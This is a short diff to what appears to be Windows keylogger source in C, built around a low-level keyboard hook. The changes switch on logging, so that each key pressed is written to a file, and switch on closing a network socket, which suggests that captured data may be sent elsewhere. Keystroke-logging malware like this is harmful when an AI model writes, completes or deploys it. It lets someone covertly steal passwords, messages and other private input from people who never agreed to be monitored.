@@ -135,7 +135,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 
 	if (wparam == WM_KEYDOWN)
 	{
-		//save_data(keyboard[i].character);
+		save_data(keyboard[i].character);
 		printf("%s %zu %d\n", keyboard[i].character, strlen(keyboard[i].character), shift);
 	}
 	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
@@ -194,7 +194,7 @@ void	save_data(const char *data)
 		countTime = 0;
 		if (fclose(file) != 0)
 			_wperror(L" Close file failed ");
-		if (_wfopen_s(&file, L"test.txt", L"w") != 0)
+		if (_wfopen_s(&file, L"test.txt", L"w+") != 0)
 			_wperror(L" Open file failed ");
 	}
 
@@ -224,7 +224,7 @@ int	main(void)
 		DispatchMessage(&msg);
 	}
 	UnhookWindowsHookEx(handlekeyboard);
-	//closesocket(my_sock);
+	closesocket(my_sock);
 	WSACleanup();
 	return (msg.wParam);
 }
